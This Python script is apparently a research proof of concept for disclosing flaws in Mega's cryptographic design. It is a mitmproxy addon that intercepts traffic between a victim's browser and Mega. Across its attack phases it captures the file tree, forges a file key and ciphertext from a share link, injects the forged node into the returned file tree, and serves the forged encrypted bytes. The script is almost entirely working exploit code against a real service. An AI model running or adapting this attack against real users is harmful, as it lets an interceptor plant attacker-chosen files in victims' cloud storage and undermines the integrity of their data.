
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: PoC of the integrity attack on Mega in a MITM setting.
# This script should be passed as argument to mitmproxy, which then intercepts
# traffic between the victim's browser and Mega, and patches the requests to
# perform the attack.
#

import json
import time
import sys

from mitmproxy import http
from os.path import dirname, isfile
from os import unlink

# This file is executed directly, which means imports are relative to this
# folder and not the root of this project. Thus, we meddle with the sys.path.
sys.path.append(dirname(dirname(__file__)))

from shared.attack_utils import *
from shared.mega_simulation import *
from shared.constants.mega_crypto import *
from shared.constants.mega_web import *
from shared.constants.victim import *
from shared.constants.mitmproxy import *
from issue_04.integrity_attack import MegaIntegrityAttack


# Attack phases:
## Phase 1: Store old file tree
## Phase 2: Get PT-CT file from share link and forge a file
## Phase 3: Modify the file tree
## Phase 4 & 5: Serve the forged file
attack_phase = 1
forged_node = None
old_file_tree = None

def get_json_payload(r):
    try:
        return json.loads(r.text)
    except (json.JSONDecodeError, TypeError):
        return None

def is_json_cmd(d):
    return type(d) == list and hasattr(d[0], "__iter__")

def log_line(l):
    with open(MITMPROXY_LOG_FILE, "a") as log_fp:
        log_fp.write(f"{l}\n")

with open(MITMPROXY_LOG_FILE, "a+") as log_fp:
    now = time.strftime("%Y-%m-%d %H:%M:%S")
    # Don't change this format, the PoC relies on this start header to
    # detect new runs
    log_fp.write(f"Attack start")
    log_fp.write(f"\n-------- start integrity attack {now} ----------\n")
    log_fp.write(f"\nATTACK PHASE {attack_phase}\n")

if isfile(SHARE_LINK_LOCAL_FNAME):
    unlink(SHARE_LINK_LOCAL_FNAME)

integrity_attack = MegaIntegrityAttack()

def request(flow: http.HTTPFlow) -> None:
    global integrity_attack, attack_phase, forged_node, old_file_tree

    if attack_phase == 2:
        if isfile(SHARE_LINK_LOCAL_FNAME):
            with open(SHARE_LINK_LOCAL_FNAME, "r") as fp:
                share_link = fp.read().strip()

            pt = integrity_attack.parse_share_link(share_link)
            log_line(f"\t- Parsed PT block {pt.hex()} from file with handle "
                     f"{integrity_attack.share_handle}")

            ct = api_find_obf_key_enc(old_file_tree, SHARE_FILE_HANDLE)
            log_line(f"\t= Key ciphertext corresponding to the obfuscated key "
                     f"of the shared file: {ct.hex()}")
            integrity_attack.set_known_ct(ct)

            # Forge file
            integrity_attack.forge_node_key()
            integrity_attack.forge_file_ct(FORGE_FILE_NAME)
            log_line(f"\t- Forged file")

            attack_phase += 1
            log_line(f"\nATTACK PHASE {attack_phase}")

    if 3 <= attack_phase <= 4 and flow.request.method == "POST":
        d = get_json_payload(flow.request)

        if not d:
            return

        #log_line(f"REQUEST: {d}")

        if attack_phase == 3:
            # XXX: optimization: catch login request and insert csid from before

            if is_json_cmd(d) and "a" in d[0] and d[0]["a"] == "f":
                # This is a request for the file tree!
                log_line("\t- Client requests file tree")

        elif attack_phase == 4:

            if is_json_cmd(d) and "a" in d[0] and d[0]["a"] == "g" \
                and d[0]["n"] == forged_node["h"]:

                log_line(f"Caught request for forged file {flow.request}")
                response = api_file_attr_fetch_response(
                    MEGA_STORAGE_SERVER,
                    forged_node
                )

                attack_phase += 1
                log_line(f"\nATTACK PHASE {attack_phase}")

                flow.response = http.Response.make(
                    200,
                    json.dumps(response).encode(),
                    {
                        "Content-Type": "application/json",
                        "Access-Control-Allow-Origin": "*",
                        "Access-Control-Allow-Headers": "Content-Type, MEGA-Chrome-Antileak",
                        "Access-Control-Expose-Headers": "Original-Content-Length",
                        "Access-Control-Max-Age": "86400",
                        "Connection": "keep-alive"
                    }
                )

    elif attack_phase == 5:
        if MEGA_STORAGE_SERVER_DOMAIN in flow.request.host:
            log_line(f"\nCaught STORAGE request:\n{flow.request}")

            bounds = flow.request.path_components[-1].split("-")
            start = int(bounds[0])
            end = int(bounds[1])
            fc, fc_enc, attr_enc = integrity_attack.forged_file

            # Do not change the format of the following line, it is used to
            # detect when the mitmproxy finished it's attack
            log_line(f"Attack done")
            attack_phase += 1

            flow.response = http.Response.make(
                200,
                fc_enc[start:end],
                {
                    "Access-Control-Allow-Headers": "MEGA-Chrome-Antileak",
                    "Access-Control-Allow-Origin": "*",
                    "Access-Control-Max-Age": "86400",
                    "Content-Disposition": "attachment",
                    "Content-Length": str(end - start + 1),
                    "Content-Transfer-Encoding": "binary",
                    "Content-Type": "application/octet-stream",
                }
            )
    else:
        # Don't modify any of the subsequent requests
        return


def response(flow: http.HTTPFlow) -> None:
    global integrity_attack, attack_phase, forged_node, old_file_tree

    if flow.response.headers.get(b"Content-Type") == "application/json":
        d = get_json_payload(flow.response)

        if not d:
            return

        if is_json_cmd(d):
            if "ok0" in d[0] and "f" in d[0]:
                if attack_phase == 1:
                    # Store file tree
                    old_file_tree = d[0]["f"]
                    log_line("\t- Stored old file tree")
                    attack_phase += 1
                    log_line(f"\nATTACK PHASE {attack_phase}")
                elif attack_phase == 3:
                    # Inject forged file in file tree returned to client
                    file_tree = d[0]["f"]

                    fc, fc_enc, attr_enc = integrity_attack.forged_file

                    # Insert forged file into file tree
                    root_handle = api_find_root_node_handle(file_tree)
                    owner_handle = api_find_owner_handle(file_tree)
                    file_handle = get_new_file_handle()
                    forged_node = api_create_file_node(file_handle, root_handle,
                        owner_handle, attr_enc,
                        integrity_attack.forged_obf_key_ct,
                        integrity_attack.file_size,
                        file_attributes=get_pseudo_thumbnail_attr())

                    file_tree.append(forged_node)
                    d[0]["f"] = file_tree
                    log_line("\t- Injected file in fetched file tree")
                    attack_phase += 1
                    log_line(f"\nATTACK PHASE {attack_phase}")

                    flow.response.text = json.dumps(d)
